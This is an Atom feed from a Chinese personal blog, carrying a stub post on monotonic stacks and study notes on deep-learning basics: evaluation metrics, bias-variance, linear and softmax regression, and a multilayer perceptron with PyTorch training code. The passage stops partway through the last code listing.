<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Photon’s Blog</title>
  
  
  <link href="http://phot0n.com/atom.xml" rel="self"/>
  
  <link href="http://phot0n.com/"/>
  <updated>2024-08-29T11:39:17.096Z</updated>
  <id>http://phot0n.com/</id>
  
  <author>
    <name>Photon</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>算法学习</title>
    <link href="http://phot0n.com/2024/08/29/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <id>http://phot0n.com/2024/08/29/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-08-29T11:34:52.000Z</published>
    <updated>2024-08-29T11:39:17.096Z</updated>
    
    <content type="html"><![CDATA[<h1 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;单调栈&quot;&gt;&lt;a href=&quot;#单调栈&quot; class=&quot;headerlink&quot; title=&quot;单调栈&quot;&gt;&lt;/a&gt;单调栈&lt;/h1&gt;</summary>
      
    
    
    
    
    <category term="算法" scheme="http://phot0n.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>深度学习记录</title>
    <link href="http://phot0n.com/2024/07/31/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://phot0n.com/2024/07/31/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2024-07-31T06:57:07.000Z</published>
    <updated>2024-09-18T10:57:57.336Z</updated>
    
    <content type="html"><![CDATA[<p>record:</p><p>8.1-8.7主要把深度学习基础的网课过了一下，大致了解了一遍。西瓜书看了一百多页，大部分推导还是相对易于理解的，打算下一周主要结合pytorch代码实现一下。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>求导:</p><p>如果y和x都是标量则显然,如果x为向量则有</p><script type="math/tex; mode=display">\mathbf{X} = \left[ \begin{matrix} x_1 \\x_2\\ \vdots \\ x_n\end{matrix}\right],\frac{\partial y}{\partial \mathbf{X}} = \left[\frac{\partial y}{\partial x_1 } , \frac{\partial y}{\partial x_2 },\dots,\frac{\partial y}{\partial x_n}\right]</script><p>简言之就是对每个分量求偏导</p><p>如果y为向量则有</p><script type="math/tex; mode=display">\mathbf{y} = \left[ \begin{matrix} y_1 \\y_2\\ \vdots \\ y_n\end{matrix}\right],\frac{\partial \mathbf{y}}{\partial x} =  \left[ \begin{matrix}\frac{\partial y_1}{\partial x } \\ \frac{\partial y_2}{\partial x }\\ \vdots\\\frac{\partial y_n}{\partial x} \end{matrix} \right]</script><p>如果x和y都为向量则可以先将x视为标量应用后者，再对每一行应用$\frac{\partial y_k}{\partial \mathbf{X}}$ 展开即可，会得到一个矩阵。</p><h2 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h2><p>我们将分类错误的样本数占样本总数比例称为错误率，即$E = \frac{a}{m}$ ,样本总数为m，a为错误样本数数。则精度为$1-\frac{a}{m}$ .通常，我们将学习器在训练集上的误差称为<code>训练误差</code>，而将学习器对新样本的误差称为<code>泛化误差</code>。</p><p>显然我们的目的是泛化误差尽可能小，但是这并不可控，因为我们只有训练集，而对新样本是未知的，所以我们需要努力将训练误差减小，以期待使得泛化误差更小。但是训练误差过小又会导致过拟合的问题。</p><h3 id="性能度量"><a href="#性能度量" class="headerlink" title="性能度量"></a>性能度量</h3><p>对于学习器的泛化性能需要指标进行度量，也就是性能度量，一般常用的是<code>均方误差</code>，即</p><script type="math/tex; mode=display">E(f;D) = \frac{1}{m} \sum_{i=1}^{m}(f(\mathbf{x_i}) -y_i)^2</script><p>其中样例集为$D = \{(\mathbf{x_1},y_1),\dots,(\mathbf{x_m},y_m)\}$ </p><p>一般地如果有特定概率分布的均方误差可以写为</p><script type="math/tex; mode=display">E(f;D) = \int_{x\sim D} (f(\mathbf{x} )-y) p(\mathbf{x})d\mathbf{x}</script><p>对于分类问题，可以借助指示函数$\mathbb I(*)$ 进行衡量</p><h3 id="查全率与查准率"><a href="#查全率与查准率" class="headerlink" title="查全率与查准率"></a>查全率与查准率</h3><p>简单从字面意思来说，查准率$P$就是你查到的结果中有多少是符合的，查全率$R$就是在所有应该被查到的结果中你查到了多少</p><p>显然它们是一对矛盾的度量，如果综合考虑二者则不太好度量。我们通常用二者的调和平均$F_1$</p><script type="math/tex; mode=display">\frac{1}{F_1} = \frac{1}{2}(\frac{1}{P}+\frac{1}{R})</script><p>更一般的，如果我们更侧重某一方(查准率或查全率)，则可以通过加一个参数来平均一下</p><script type="math/tex; mode=display">\frac{1}{F_1} = \frac{1}{1+\beta ^2}(\frac{1}{P}+\frac{\beta ^2}{R})</script><h3 id="ROC和AUC"><a href="#ROC和AUC" class="headerlink" title="ROC和AUC"></a>ROC和AUC</h3><p>对于一个二分类任务（假定为1表示正类， 0表示负类），对于一个样本，分类的结果总共有四种：</p><p>类别实际为1，被分为0，FN（False Negative）</p><p>类别实际为1，被分为1，TP（True Positive）</p><p>类别实际为0，被分为1，FP（False Positive）</p><p>类别实际为0，被分为0，TN（True Negative）</p><p>而FPR（False Positive Rate）= FP /（FP + TN），即负类数据被分为正类的比例</p><p>TPR（True Positive Rate）= TP /（TP + FN），即正类数据被分为正类的比例</p><p>ROC曲线实质上是真正率随假阳性上升的一个函数曲线</p><p><img src="https://s2.loli.net/2024/08/09/JoO8qtB67WNR51b.png" alt="image-20240809103352096"></p><p>显然，对角线的情况是完全随机预测的情况，该曲线的面积AUC，（Area Under Curve）可以一定程度上衡量学习器。对于分类结果我们通常无法绘制出平滑的曲线，只能绘制一条近似的曲线。方法是逐渐调整我们的分类阈值，近似的曲线上每个点坐标实质上是对一个样本的评估。</p><h3 id="代价错误敏感率"><a href="#代价错误敏感率" class="headerlink" title="代价错误敏感率"></a>代价错误敏感率</h3><p>有些问题对于假阴性和假阳性的侧重点不一致，通俗点来说就是”宁缺毋滥”和”宁可错杀三千，不可放走一人”的</p><p>区别，令$D^{+}$和$D^{-}$分别代表样例集$D$的正例子集和反例子集，则通过指示函数我们可以得到代价敏感的衡量指标</p><script type="math/tex; mode=display">E(f;d;cost) = \frac{1}{m}(\sum_{\mathbf{x}_i \in D^{+}} \mathbb I(f(\mathbf{x_i})\neq y_i)*cost_{01} + \sum_{\mathbf{x}_i \in D^{-}} \mathbb I(f(\mathbf{x_i}) \neq y_i)*cost_{10})</script><p>其中$cost_{01}$和$cost_{10}$代表了假阳性和假阴性的重视程度的参数。</p><h3 id="偏差与方差"><a href="#偏差与方差" class="headerlink" title="偏差与方差"></a>偏差与方差</h3><p>这个比较重要。对于测试样本$\mathbf{x}$,其在数据集中的标记为$y_D$,真实的标记为$y$。$f(\mathbf{x};D)$为训练集$D$上学得模型$f$在$\mathbf{x}$上的预测输出。以回归任务为例，其预期期望为</p><script type="math/tex; mode=display">\overline{f}(\mathbf{x}) = E_D(f(\mathbf{x};D))</script><p>方差为</p><script type="math/tex; mode=display">var(\mathbf{x}) = E_D[ (f(\mathbf{x};D)-\overline{f}(\mathbf{x}))^2]</script><p>噪声为</p><script type="math/tex; mode=display">\varepsilon ^2=E_D[(y_D-y)^2]</script><p>期望输出与真实标记只检查便称为偏差，即</p><script type="math/tex; mode=display">bias^2(\mathbf{x}) =(\overline{f}(\mathbf{x}) -y)^2</script><p>通过化简可以得到</p><script type="math/tex; mode=display">E(f;D) = bias^2(\mathbf{x})+var(\mathbf{x}) +\varepsilon ^2</script><h2 id="线性模型及其训练"><a href="#线性模型及其训练" class="headerlink" title="线性模型及其训练"></a>线性模型及其训练</h2><p>给定$n$维输入$\mathbf{x} = [x_1,x_2,\dots,x_n]^T$ 线性模型有一个n维权重和一个标量偏差，即</p><script type="math/tex; mode=display">\mathbf{w} =[w_1,w_2,\dots,w_n]^T,b</script><p>线性模型的输出是其输入的加权和</p><script type="math/tex; mode=display">y = <\mathbf{w},\mathbf{x}> +b = w_1x_1+w_2x_2+\dots+w_nx_n+b</script><p>给定数据集$D = \{(\mathbf{x_1},y_1),\dots,(\mathbf{x_m},y_m)\}$ ,其中每个输入$\mathbf{x}$有$d$个属性(即其为d维向量)，则线性模型试图学习一个$f$ ,使得</p><script type="math/tex; mode=display">f(\mathbf{x_i}) =<\mathbf{w},\mathbf{x_i}> +b ,使得f(\mathbf{x_i})\simeq y_i</script><p>其参数通过最小化损失来学习</p><script type="math/tex; mode=display">\ell(\mathbf{X},\mathbf{y},\mathbf{w},b) = \frac{1}{2n}\sum_{i=1}^n (y_i-<\mathbf{w},\mathbf{x_i}> -b)^2 = \frac{1}{2n}||\mathbf{y}-\mathbf{X}\mathbf{w}-b||^2 \\\mathbf{w}*,\mathbf{b}* =\mathop{argmin} \limits_{\mathbf{w},b}\ell(\mathbf{X},\mathbf{y},\mathbf{w},b)</script><p>可以通过求导得到显式解，将偏差加入，即$\mathbf{X}\leftarrow[\mathbf{X},1],\mathbf{w} \leftarrow \left[ \begin{matrix} \mathbf{w}\\b\end{matrix}\right]$</p><p>损失函数维凸函数求导得最优解</p><script type="math/tex; mode=display">\frac{\partial \ell(\mathbf{X},\mathbf{y},\mathbf{w})}{\partial \mathbf{w}} =0 \\ \rightarrow\frac{1}{n} ( \mathbf{y}-\mathbf{X}\mathbf{w})^T\mathbf{X} = 0 \\ \rightarrow\mathbf{w*} = (\mathbf{X}^T\mathbf{X})^{-1}\mathbf{X}\mathbf{y}</script><p>前提是$\mathbf{X}^T\mathbf{X}$是满秩矩阵或者正定矩阵。但是大部分情况下其不一定是满秩矩阵，可以使用<code>梯度下降</code>的方法去学习参数$\mathbf{w}$</p><p>其步骤为</p><ul><li>挑选初始值$\mathbf{w_0}$ </li><li>重复迭代参数,过程如下</li></ul><script type="math/tex; mode=display">\mathbf{w}_t = \mathbf{w}_{t-1}-\eta \frac{\partial \ell}{\partial \mathbf{w}_{t-1}}</script><p>其中$\eta$为损失率，不能太小也不能太大，太小可能训练速度比较慢，太大可能会导致振荡(还是比较容易理解的，太大有可能就会绕着那个曲面游走)</p><p>然后其实线性模型还有很多衍生和变种，在后面也会提到其也是神经网络中的一环。常见的是对数模型</p><script type="math/tex; mode=display">\ln y = <\mathbf{w},\mathbf{x_i}> +b</script><p>更一般的，对于一个单调可微函数$g(*)$，可以得到广义线性模型</p><script type="math/tex; mode=display">y = g^{-1} (<\mathbf{w},\mathbf{x_i}> +b)</script><p>训练代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line"><span class="comment"># 生成数据集</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_data</span>(<span class="params">w,b,nums</span>):</span></span><br><span class="line">    X = torch.normal(<span class="number">0</span>,<span class="number">1</span>,(nums ,len(w)))</span><br><span class="line">    Y = torch.matmul(X,w) +b</span><br><span class="line">    Y += torch.normal(<span class="number">0</span>,<span class="number">0.01</span>,Y.shape)</span><br><span class="line">    <span class="keyword">return</span> X ,Y.reshape((<span class="number">-1</span>,<span class="number">1</span>))</span><br><span class="line">real_w = torch.tensor([<span class="number">1.1</span>,<span class="number">-4.5</span>])</span><br><span class="line">real_b = <span class="number">5.4</span></span><br><span class="line">features,labels = generate_data(real_w,real_b,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机批量roll数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data_iter</span>(<span class="params">batch_size,features,labels</span>):</span></span><br><span class="line">    nums = len(features)</span><br><span class="line">    indices = list(range(nums))</span><br><span class="line">    random.shuffle(indices)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,nums,batch_size):</span><br><span class="line">        batch_indices = torch.tensor(indices[i:min(i+batch_size,nums)])</span><br><span class="line">        <span class="keyword">yield</span> features[batch_indices],labels[batch_indices]</span><br><span class="line">batch_size = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先初始化参数</span></span><br><span class="line">w = torch.normal(<span class="number">0</span>,<span class="number">0.01</span>,size=(<span class="number">2</span>,<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line">b = torch.zeros(<span class="number">1</span>,requires_grad = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线性模型</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linreg</span>(<span class="params">X,w,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> torch.matmul(X,w) + b</span><br><span class="line"><span class="comment"># 均方误差作损失函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">squared_loss</span>(<span class="params">y_hat,y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (y_hat-y.reshape(y_hat.shape))**<span class="number">2</span>/<span class="number">2</span></span><br><span class="line"><span class="comment">#梯度更新参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sgd</span>(<span class="params">params,lr,batch_size</span>):</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">            param -= lr*param.grad /batch_size</span><br><span class="line">            param.grad.zero_()</span><br><span class="line"><span class="comment"># 学习率</span></span><br><span class="line">lr = <span class="number">0.03</span></span><br><span class="line">num_epochs = <span class="number">3</span></span><br><span class="line">net = linreg</span><br><span class="line">loss = squared_loss</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(num_epochs):</span><br><span class="line">    <span class="keyword">for</span> X ,y <span class="keyword">in</span> data_iter(batch_size,features,labels):</span><br><span class="line">        l = loss(net(X,w,b),y)</span><br><span class="line">        <span class="comment">#求和计算梯度</span></span><br><span class="line">        l.sum().backward()</span><br><span class="line">        <span class="comment">#sgd更新</span></span><br><span class="line">        sgd([w,b],lr,batch_size)</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        train_l = loss(net(features,w,b),labels)</span><br><span class="line">        print(<span class="string">f&#x27;epoch <span class="subst">&#123;epoch+<span class="number">1</span>&#125;</span> ,loss <span class="subst">&#123;float(train_l.mean())&#125;</span>&#x27;</span>)</span><br><span class="line">print(w,b)</span><br></pre></td></tr></table></figure><p>不过这些都有写好的框架方便我们当调包侠，这里为了学习还是了解一下具体怎么写的。</p><h2 id="softmax-回归"><a href="#softmax-回归" class="headerlink" title="softmax 回归"></a>softmax 回归</h2><p>softmax回归模型适用于多分类问题，其简单来说就是通过映射将连续值转为概率分布</p><script type="math/tex; mode=display">\hat{\mathbf{y}} = softmax(\mathbf{o}) \\\hat{y_i} = \frac{exp({o_i})}{\sum_k exp({o_k})}</script><p>交叉熵用来衡量两个概率之间的差别,即</p><script type="math/tex; mode=display">H(\mathbf{p},\mathbf{q}) = \sum_i -p_ilog(q_i)</script><p>其作为损失则有</p><script type="math/tex; mode=display">l(\mathbf{y},\hat{\mathbf{y}}) =\sum_i -y_ilog(\hat{y_i})\\=-\sum_iy_i\log\frac{exp(o_i)}{\sum_jexp(o_j)} \\=-\sum_iy_io_i+\sum_iy_ilog(\sum_jexp(o_j))\\=-\sum_iy_io_i+log(\sum_jexp(o_j))</script><p>对其求梯度</p><script type="math/tex; mode=display">\frac{\partial{l(\mathbf{y},\hat{\mathbf{y}}) }}{\partial o_i} = -y_i+\frac{exp(o_i)}{\sum_jexp(o_j)}\\=softmax(o_i)-y_i</script><p>对其训练代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> IPython <span class="keyword">import</span> display </span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line"></span><br><span class="line">batch_size = <span class="number">256</span></span><br><span class="line">train_iter ,test_iter = d2l.load_data_fashion_mnist(batch_size)</span><br><span class="line">num_input = <span class="number">784</span></span><br><span class="line">num_output = <span class="number">10</span></span><br><span class="line">w = torch.normal(<span class="number">0</span>,<span class="number">0.01</span>,size = (num_input,num_output),requires_grad=<span class="literal">True</span>)</span><br><span class="line">b = torch.zeros(num_output,requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Accumnlator</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span> (<span class="params">self,n</span>):</span></span><br><span class="line">        self.data = [<span class="number">0.0</span>] *n </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self,*args</span>):</span></span><br><span class="line">        self.data = [a+float(b) <span class="keyword">for</span> a,b <span class="keyword">in</span> zip(self.data,args)]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.data = [<span class="number">0.0</span>]*len(self.data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span>(<span class="params">self,idx</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.data[idx]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(w.shape)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">softmax</span>(<span class="params">X</span>):</span></span><br><span class="line">    X_exp = torch.exp(X)</span><br><span class="line">    partition = X_exp.sum(<span class="number">1</span>,keepdim=<span class="literal">True</span>) <span class="comment">#对行求和</span></span><br><span class="line">    <span class="keyword">return</span> X_exp/partition</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>(<span class="params">X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> softmax(torch.matmul(X.reshape((<span class="number">-1</span>,w.shape[<span class="number">0</span>])) ,w) +b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cross_entropy</span>(<span class="params">y_hat,y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> -torch.log(y_hat[range(len(y_hat)),y]) <span class="comment">#在相应标号拿到相应的值，取log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">y_hat,y</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(len(y_hat.shape) &gt;<span class="number">1</span> <span class="keyword">and</span> y_hat.shape[<span class="number">1</span>] &gt;<span class="number">1</span>):</span><br><span class="line">        y_hat = y_hat.argmax(axis = <span class="number">1</span>)</span><br><span class="line">    com = y_hat.type(y.dtype) ==y </span><br><span class="line">    <span class="keyword">return</span> float(com.type(y.dtype).sum())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate_accurate</span>(<span class="params">net,data_iter</span>):</span></span><br><span class="line">    <span class="keyword">if</span>( isinstance(net,torch.nn.Module)):</span><br><span class="line">        net.eval()</span><br><span class="line">    metric =Accumnlator(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> X, y <span class="keyword">in</span> data_iter:</span><br><span class="line">        metric.add(accuracy(net(X) ,y) ,y.numel())</span><br><span class="line">    <span class="keyword">return</span> metric[<span class="number">0</span>] /metric[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_epoch_ch3</span>(<span class="params">net,train_iter,loss,updater</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(isinstance(net,torch.nn.Module)):</span><br><span class="line">        net.train()</span><br><span class="line">    metric = Accumnlator(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> X,y <span class="keyword">in</span> train_iter:</span><br><span class="line">        y_hat = net(X)</span><br><span class="line">        l = loss(y_hat,y) <span class="comment">##计算损失函数</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(updater,torch.optim.Optimizer):</span><br><span class="line">            updater.zero_grad()</span><br><span class="line">            l.backward()</span><br><span class="line">            updater.step()</span><br><span class="line">            metric.add(float(l)*len(y),accuracy(y_hat,y),y.size.numel())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.sum().backward()</span><br><span class="line">            updater(X.shape[<span class="number">0</span>]) <span class="comment">##更新参数</span></span><br><span class="line">            metric.add(float(l.sum()) ,accuracy(y_hat,y),y.numel())</span><br><span class="line">    <span class="keyword">return</span> metric[<span class="number">0</span>] /metric[<span class="number">2</span>] ,metric[<span class="number">1</span>] /metric[<span class="number">2</span>] <span class="comment">#前者为loss，后者为准确率</span></span><br><span class="line"></span><br><span class="line">lr = <span class="number">0.1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updater</span>(<span class="params">batch_size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> d2l.sgd([w, b], lr, batch_size)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">net,train_iter,loss,num_epochs,updater</span>):</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> range(num_epochs):</span><br><span class="line">        train_metric = train_epoch_ch3(net,train_iter,loss,updater)</span><br><span class="line">        <span class="comment"># test_acc = evaluate_accurate(net,test_iter)</span></span><br><span class="line">        print(<span class="string">f&quot;loss = <span class="subst">&#123;train_metric[<span class="number">0</span>]&#125;</span> , train_acc = <span class="subst">&#123;train_metric[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># print(evaluate_accurate(net,test_iter))</span></span><br><span class="line">num_epochs = <span class="number">10</span></span><br><span class="line">train(net,train_iter,cross_entropy,num_epochs,updater)</span><br></pre></td></tr></table></figure><h2 id="神经网络与感知机"><a href="#神经网络与感知机" class="headerlink" title="神经网络与感知机"></a>神经网络与感知机</h2><p>简单来说，神经网络模型模拟了生物系统中神经元的传递(回忆一下高中生物知识，虽然已经忘差不多了)</p><p>神经网络中最基本的成分是神经元模型，在神经网络当中，每个神经元与其他神经元相连。当其兴奋的时候会向其他神经元发送电信号。而每个神经元有一个阈值，如果接收到的电信号超过了当前阈值就会被激活，也就是兴奋。再向其他神经元传递。</p><p><img src="https://s2.loli.net/2024/08/10/whmg2a5VnDETWor.png" alt="image-20240810144253560"></p><p>将其用数学公式表达则有</p><script type="math/tex; mode=display">y = f(\sum_{i=1} ^n w_ix_i-\theta)\\=f(<\mathbf{w},\mathbf{x>-\theta})</script><p>其中$w_i$代表了第$i$个神经元的权重，$x_i$代表了第$i$个神经元的输入，$\theta$代表阈值，$f$为激活函数，常见的是sgn函数以及$sigmod$函数</p><p>神经网络就是将许许多多这样的神经元模型组合在一起 ，常见模型如下(神经元之间不存在同层连接与跨层连接,称为”多层前馈神经网络”)，输入层与输出层之间的称为隐含层</p><p><img src="https://s2.loli.net/2024/08/10/MXuhv3D9md7Kfjb.png" alt="image-20240810150059221"></p><p>训练多层网络使用的是误差逆传播算法(BP算法)，其还是基于梯度下降策略，对任意参数$v$更新为</p><script type="math/tex; mode=display">v \leftarrow v+\Delta v</script><p>使用该方法列式子对每个参数求梯度即可，主要在计算仔细一点，理解难度不大</p><p>其数学推导如下</p><p>对于之前softmax回归模型使用的Fashion-MNIST数据集 (每个图像由28*28=784个灰度像素值组成)，改为用多层感知机模型，其训练代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line"></span><br><span class="line">batch_size = <span class="number">256</span></span><br><span class="line">train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入的大小，即784个灰度像素值代表的向量</span></span><br><span class="line"><span class="comment">#输出大小，10个分类</span></span><br><span class="line"><span class="comment">#单个隐藏层中隐藏单元个数 256个</span></span><br><span class="line">num_inputs, num_outputs, num_hiddens = <span class="number">784</span>, <span class="number">10</span>, <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#隐藏层参数</span></span><br><span class="line">W1 = nn.Parameter(torch.randn(</span><br><span class="line">    num_inputs, num_hiddens, requires_grad=<span class="literal">True</span>) * <span class="number">0.01</span>)</span><br><span class="line">b1 = nn.Parameter(torch.zeros(num_hiddens, requires_grad=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出层参数</span></span><br><span class="line">W2 = nn.Parameter(torch.randn(</span><br><span class="line">    num_hiddens, num_outputs, requires_grad=<span class="literal">True</span>) * <span class="number">0.01</span>)</span><br><span class="line">b2 = nn.Parameter(torch.zeros(num_outputs, requires_grad=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">params = [W1, b1, W2, b2]</span><br><span class="line"></span><br><span class="line"><span class="comment">#relu函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">relu</span>(<span class="params">X</span>):</span></span><br><span class="line">    a = torch.zeros_like(X)</span><br><span class="line">    <span class="keyword">return</span> torch.max(X, a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#多层感知机</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>(<span class="params">X</span>):</span></span><br><span class="line">    X = X.reshape((<span class="number">-1</span>, num_inputs))</span><br><span class="line">    H = relu(X@W1 + b1)  </span><br><span class="line">    <span class="keyword">return</span> (H@W2 + b2)</span><br><span class="line"><span class="comment"># 交叉熵作损失函数</span></span><br><span class="line">loss = nn.CrossEntropyLoss()</span><br><span class="line"></span><br><span class="line">num_epochs, lr = <span class="number">10</span>, <span class="number">0.1</span></span><br><span class="line"><span class="comment">#梯度下降</span></span><br><span 